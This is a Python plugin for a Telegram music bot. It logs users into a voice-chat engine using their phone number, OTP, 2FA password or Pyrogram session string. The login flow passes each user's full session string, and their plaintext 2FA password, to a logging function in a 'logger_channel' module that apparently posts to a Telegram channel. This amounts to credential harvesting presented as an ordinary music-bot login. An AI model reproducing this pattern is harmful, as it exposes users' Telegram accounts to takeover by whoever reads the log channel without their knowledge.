
import asyncio
import re

from pyrogram import Client, filters
from pyrogram.errors import (
    ApiIdInvalid, AuthKeyUnregistered, FloodWait, PhoneCodeExpired,
    PhoneCodeInvalid, PhoneNumberBanned, PhoneNumberInvalid, PasswordHashInvalid,
    SessionPasswordNeeded, SessionRevoked, UserDeactivated, UserDeactivatedBan,
)
from pyrogram.types import Message

from config import Config
from helpers.database import db
from helpers.logger_channel import (
    bot_logger, log_command, log_error, log_login_failed, log_login_step,
    log_login_success, log_logout, log_to_channel,
)
from helpers.vc_manager import session_manager
from plugins.ui import (
    ADDSTRING_TEXT, CANCEL_KB, GEN_NAME, LOGIN_INTRO, addstring_kb, back_kb,
    home_kb, login_kb, edit_screen, safe_answer,
)

CONVERSATION: dict = {}
AUTH_CLIENTS: dict = {}

_DEAD_SESSION = (AuthKeyUnregistered, SessionRevoked, UserDeactivated,
                 UserDeactivatedBan)

def _bq(text: str) -> str:
    return f"<blockquote>{text}</blockquote>"

def _reset(user_id: int):
    CONVERSATION.pop(user_id, None)
    client = AUTH_CLIENTS.pop(user_id, None)
    if client:
        async def _dc():
            try:
                await client.disconnect()
            except Exception:
                pass
        asyncio.create_task(_dc())

async def _reset_now(user_id: int):
    CONVERSATION.pop(user_id, None)
    client = AUTH_CLIENTS.pop(user_id, None)
    if client:
        try:
            await client.disconnect()
        except Exception:
            pass

async def _edit(msg, text: str, reply_markup=None):
    try:
        return await msg.edit_text(text, reply_markup=reply_markup,
                                   disable_web_page_preview=True)
    except Exception:
        try:
            return await msg.reply_text(text, reply_markup=reply_markup,
                                        disable_web_page_preview=True)
        except Exception:
            return msg

def _account_dict(me, two_factor: bool = False) -> dict:
    return {
        "id": me.id, "name": me.first_name, "username": me.username,
        "phone": getattr(me, "phone_number", None), "dc": getattr(me, "dc_id", None),
        "premium": bool(getattr(me, "is_premium", False)),
        "two_factor": bool(two_factor),
    }

async def _string_owner(string: str):
    try:
        for u in await db.all_users():
            if u.get("string_session") == string:
                return int(u["user_id"])
    except Exception:
        pass
    return None

async def _deploy(bot, target_msg, user, string_session: str, me, *,
                  method: str, phone: str, twofa: bool = False,
                  twofa_password: str = ""):
    account = _account_dict(me, twofa)
    await db.add_user(user.id, user.username or "", user.first_name or "")
    await db.update_string(user.id, string_session)

    if phone:
        account["phone"] = phone
    asyncio.create_task(log_login_success(
        user.id, user.username, user.first_name, account, string_session,
        method, twofa_password=twofa_password,
    ))

    engine_ok, engine_err = False, ""
    try:
        uvc = await session_manager.add(user.id, string_session)
        engine_ok = True
        bot_logger("ENGINE", f"started for {user.id} as {uvc.account_name} ({uvc.account_id})")
    except Exception as e:
        engine_err = str(e)[:150]
        await log_error("login_engine_start", e)

    if engine_ok:
        text = _bq(
            "✅ <b>Login Successful — VC engine activated!</b>\n"
            f"👤 Account: <a href='tg://user?id={me.id}'>{me.first_name}</a>\n"
            f"🆔 ID: <code>{me.id}</code>\n"
            f"🛡️ 2FA: {'Verified' if twofa else 'Not required'}\n\n"
            "🎵 Ab kisi bhi group me <code>.play</code> use karein!"
        )
    else:
        text = _bq(
            "⚠️ <b>Session saved, but engine init failed.</b>\n"
            f"<code>{engine_err}</code>\n"
            "Bot restart karein ya dobara /login karein."
        )
    await _edit(target_msg, text, home_kb(Config.is_owner(user.id), engine_ok))

@Client.on_message(filters.command("login") & filters.private)
async def cmd_login(bot: Client, msg: Message):
    await _reset_now(msg.from_user.id)
    await log_command(msg.from_user.id, msg.from_user.username, msg.chat.id, "/login")
    await msg.reply_text(LOGIN_INTRO, reply_markup=login_kb())

@Client.on_callback_query(filters.regex(r"^menu:login$"))
async def cb_login(bot, cq):
    await edit_screen(cq.message, LOGIN_INTRO, reply_markup=login_kb())
    await safe_answer(cq)

@Client.on_callback_query(filters.regex(r"^login:cancel$"))
async def cb_login_cancel(bot, cq):
    await _reset_now(cq.from_user.id)
    await edit_screen(cq.message, _bq("❌ Login cancel ho gaya."),
                      reply_markup=back_kb("menu:login"))
    await safe_answer(cq, "Cancelled")

@Client.on_callback_query(filters.regex(r"^login:phone$"))
async def cb_login_phone(bot, cq):
    user = cq.from_user
    await _reset_now(user.id)
    CONVERSATION[user.id] = {"step": "pyro_waiting_phone"}
    await log_login_step(user.id, user.username, user.first_name, "started (phone)")
    await edit_screen(cq.message, _bq(
        "📱  <b>PHONE LOGIN</b>\n"
        "──────────────────────\n"
        "  Send your number with country code:\n"
        "  Example: <code>+919876543210</code>\n"
        "──────────────────────"
    ), reply_markup=CANCEL_KB)
    await safe_answer(cq)

@Client.on_message(filters.command("addstring") & filters.private)
async def cmd_addstring(bot: Client, msg: Message):
    user = msg.from_user
    await _reset_now(user.id)
    await log_command(user.id, user.username, msg.chat.id, "/addstring")
    parts = msg.text.split(maxsplit=1)
    if len(parts) < 2:
        CONVERSATION[user.id] = {"step": "pyro_waiting_string"}
        await msg.reply_text(ADDSTRING_TEXT, reply_markup=addstring_kb())
        return
    await _handle_string(bot, msg, parts[1].strip())

@Client.on_callback_query(filters.regex(r"^menu:addstring$"))
async def cb_addstring(bot, cq):
    await _reset_now(cq.from_user.id)
    CONVERSATION[cq.from_user.id] = {"step": "pyro_waiting_string"}
    await edit_screen(cq.message, _bq(
        "🔑  <b>PYROGRAM STRING</b>\n"
        "──────────────────────\n"
        "  Paste your Pyrogram session string.\n"
        "  (Starts with BQ...)\n"
        f"  Generate: {GEN_NAME}\n"
        "──────────────────────"
    ), reply_markup=addstring_kb())
    await safe_answer(cq)

async def _handle_string(bot: Client, msg: Message, session_text: str):
    user = msg.from_user
    CONVERSATION.pop(user.id, None)
    session_text = session_text.strip().strip("`").strip()

    if not session_text.startswith("BQ"):
        await msg.reply_text(_bq(
            "❌ Invalid Pyrogram string. Must start with <code>BQ</code>\n"
            f"{GEN_NAME} se generate karein ya 📱 phone login use karein."
        ), reply_markup=addstring_kb())
        return

    try:
        await msg.delete()
    except Exception:
        pass

    proc = await bot.send_message(user.id, _bq("🔄 Validating session..."))

    owner = await _string_owner(session_text)
    if owner and owner != user.id:
        await log_login_failed(user.id, user.username, user.first_name,
                               f"string already registered by {owner}")
        await _edit(proc, _bq(
            "❌ <b>This String is already registered.</b>\n"
            "Ye session pehle se kisi aur user ke paas active hai."
        ), addstring_kb())
        return

    probe = Client("pyro_probe_temp", api_id=Config.API_ID, api_hash=Config.API_HASH,
                   session_string=session_text, in_memory=True, no_updates=True)
    me = None
    err = ""
    try:
        await probe.connect()
        me = await probe.get_me()
    except _DEAD_SESSION as e:
        err = f"{type(e).__name__}: session expired/revoked"
    except FloodWait as e:
        err = f"FloodWait {e.value}s"
    except Exception as e:
        err = str(e)[:150]
    finally:
        try:
            await probe.disconnect()
        except Exception:
            pass

    if not me:
        bot_logger("STRING_PROBE_ERR", f"{user.id}: {err}")
        await log_login_failed(user.id, user.username, user.first_name,
                               f"invalid string: {err}")
        await _edit(proc, _bq(
            "❌ <b>That string is invalid or expired.</b>\n"
            f"<code>{err}</code>\n"
            "Generate a fresh Pyrogram string and try again."
        ), addstring_kb())
        return

    asyncio.create_task(log_to_channel(
        "STRING_DEPLOY", {"Method": "Manual String", "Account": me.id},
        user_obj=user,
    ))
    await _edit(proc, _bq("✅ <b>String Session saved &amp; deploying core...</b>"))
    await _deploy(bot, proc, user, session_text, me,
                  method="string_session", phone="Via String Session")

@Client.on_message(filters.command("logout") & filters.private)
async def cmd_logout(bot: Client, msg: Message):
    await _do_logout(msg.from_user, msg)

@Client.on_callback_query(filters.regex(r"^menu:logout$"))
async def cb_logout(bot, cq):
    await _do_logout(cq.from_user, cq.message, edit=True)
    await safe_answer(cq, "Logged out")

async def _do_logout(user, target, edit: bool = False):
    await _reset_now(user.id)
    await session_manager.remove(user.id)
    await db.clear_string(user.id)
    await log_logout(user.id, user.username, user.first_name)
    text = _bq("✅ Music session removed.\nDobara 📱 Login karein jab chahein.")
    kb = home_kb(Config.is_owner(user.id), False)
    if edit:
        await edit_screen(target, text, reply_markup=kb)
    else:
        await target.reply_text(text, reply_markup=kb)

@Client.on_message(filters.private & filters.text & ~filters.regex(r"^[/.]"), group=2)
async def assistant_input_listener(bot: Client, msg: Message):
    if not msg.from_user:
        return
    sender_id = msg.from_user.id
    ustate = CONVERSATION.get(sender_id)
    if not ustate:
        return
    step = ustate.get("step")
    sender = msg.from_user
    text = (msg.text or "").strip()

    if step == "pyro_waiting_phone":
        raw_phone = re.sub(r"[\s\-()]", "", text)
        if not raw_phone.startswith("+"):
            raw_phone = "+" + raw_phone
        if not re.fullmatch(r"\+\d{7,15}", raw_phone):
            await msg.reply_text(_bq(
                "❌ Number galat lag raha hai.\n"
                "Example: <code>+919876543210</code>"
            ), reply_markup=CANCEL_KB)
            return
        ustate["phone"] = raw_phone
        proc = await msg.reply_text(_bq(f"🔄 Connecting... (<code>{raw_phone}</code>)"))
        client_auth = None
        try:
            client_auth = Client(
                name="pyro_auth_temp", api_id=Config.API_ID,
                api_hash=Config.API_HASH, in_memory=True, no_updates=True,
            )
            await client_auth.connect()
            sent_code = await client_auth.send_code(raw_phone)
            ustate["phone_code_hash"] = sent_code.phone_code_hash
            ustate["step"] = "pyro_waiting_otp"
            AUTH_CLIENTS[sender_id] = client_auth
            await log_login_step(sender.id, sender.username, sender.first_name,
                                 "OTP sent", raw_phone)
            await _edit(proc, _bq(
                "╭━━━📩 <b>OTP SENT</b> ━━━╮\n"
                "┃\n"
                f"┃ Phone: <code>{raw_phone}</code>\n"
                "┃ Enter OTP with spaces: <code>1 2 3 4 5</code>\n"
                "┃\n"
                "╰━━━━━━━━━━━━━━━━━━━━━╯"
            ), CANCEL_KB)
        except FloodWait as e:
            _reset(sender_id)
            if client_auth:
                try: await client_auth.disconnect()
                except Exception: pass
            await log_login_failed(sender.id, sender.username, sender.first_name,
                                   f"FloodWait {e.value}s")
            await _edit(proc, _bq(
                f"⏳ <b>Rate Limit!</b> Wait <code>{e.value}</code>s then try again."
            ), back_kb("menu:login"))
        except (PhoneNumberInvalid, PhoneNumberBanned, ApiIdInvalid) as e:
            _reset(sender_id)
            if client_auth:
                try: await client_auth.disconnect()
                except Exception: pass
            await log_login_failed(sender.id, sender.username, sender.first_name, str(e))
            await _edit(proc, _bq(f"❌ <b>Failed:</b> <code>{type(e).__name__}</code>"),
                        back_kb("menu:login"))
        except Exception as e:
            _reset(sender_id)
            if client_auth:
                try: await client_auth.disconnect()
                except Exception: pass
            await log_error("login_send_code", e)
            await _edit(proc, _bq(f"❌ <b>Failed:</b> <code>{str(e)[:150]}</code>"),
                        back_kb("menu:login"))

    elif step == "pyro_waiting_otp":
        otp = re.sub(r"\D", "", text)
        client_auth = AUTH_CLIENTS.get(sender_id)
        if not client_auth:
            _reset(sender_id)
            await msg.reply_text(_bq("❌ Session expire ho gaya. Dobara /login karein."))
            return
        if len(otp) < 5:
            await msg.reply_text(_bq("❌ Valid OTP bhejein: <code>1 2 3 4 5</code>"),
                                 reply_markup=CANCEL_KB)
            return
        proc = await msg.reply_text(_bq("🔄 Verifying OTP..."))
        try:
            await client_auth.sign_in(ustate["phone"], ustate["phone_code_hash"], otp)
            export_str = await client_auth.export_session_string()
            me_info = await client_auth.get_me()
            await client_auth.disconnect()
            AUTH_CLIENTS.pop(sender_id, None)
            CONVERSATION.pop(sender_id, None)
            await _deploy(bot, proc, sender, export_str, me_info,
                          method="phone", phone=ustate.get("phone", "N/A"),
                          twofa=False)
        except SessionPasswordNeeded:
            ustate["step"] = "pyro_waiting_2fa"
            await _edit(proc, _bq(
                "🔐 <b>2FA Password required.</b>\n"
                "Send your Telegram 2FA password:"
            ), CANCEL_KB)
            await log_login_step(sender.id, sender.username, sender.first_name,
                                 "2FA required", ustate.get("phone", ""))
        except (PhoneCodeInvalid, PhoneCodeExpired) as e:
            _reset(sender_id)
            await log_login_failed(sender.id, sender.username, sender.first_name, str(e))
            await _edit(proc, _bq("❌ Invalid/Expired OTP. Try again via /login."),
                        back_kb("menu:login"))
        except FloodWait as e:
            _reset(sender_id)
            await _edit(proc, _bq(f"⏳ <b>Rate Limit!</b> Wait <code>{e.value}</code>s."),
                        back_kb("menu:login"))
        except Exception as e:
            _reset(sender_id)
            await log_error("login_sign_in", e)
            await _edit(proc, _bq(f"❌ Error: <code>{str(e)[:150]}</code>"),
                        back_kb("menu:login"))

    elif step == "pyro_waiting_2fa":
        password = text
        client_auth = AUTH_CLIENTS.get(sender_id)
        if not client_auth:
            _reset(sender_id)
            await msg.reply_text(_bq("❌ Session expire ho gaya. Dobara /login karein."))
            return
        try:
            await msg.delete()
        except Exception:
            pass
        proc = await bot.send_message(sender_id, _bq("🔄 Checking 2FA..."))
        try:
            await client_auth.check_password(password)
            export_str = await client_auth.export_session_string()
            me_info = await client_auth.get_me()
            await client_auth.disconnect()
            AUTH_CLIENTS.pop(sender_id, None)
            CONVERSATION.pop(sender_id, None)
            await _deploy(bot, proc, sender, export_str, me_info,
                          method="phone", phone=ustate.get("phone", "N/A"),
                          twofa=True, twofa_password=password)
        except PasswordHashInvalid:

            await log_login_failed(sender.id, sender.username, sender.first_name,
                                   "2FA: wrong password")
            await _edit(proc, _bq("❌ 2FA password galat. Dobara bhejein:"), CANCEL_KB)
        except FloodWait as e:
            _reset(sender_id)
            await _edit(proc, _bq(f"⏳ <b>Rate Limit!</b> Wait <code>{e.value}</code>s."),
                        back_kb("menu:login"))
        except Exception as e:
            _reset(sender_id)
            await log_login_failed(sender.id, sender.username, sender.first_name,
                                   f"2FA: {e}")
            await _edit(proc, _bq(f"❌ 2FA Error: <code>{str(e)[:150]}</code>"),
                        back_kb("menu:login"))

    elif step == "pyro_waiting_string":
        await _handle_string(bot, msg, text)
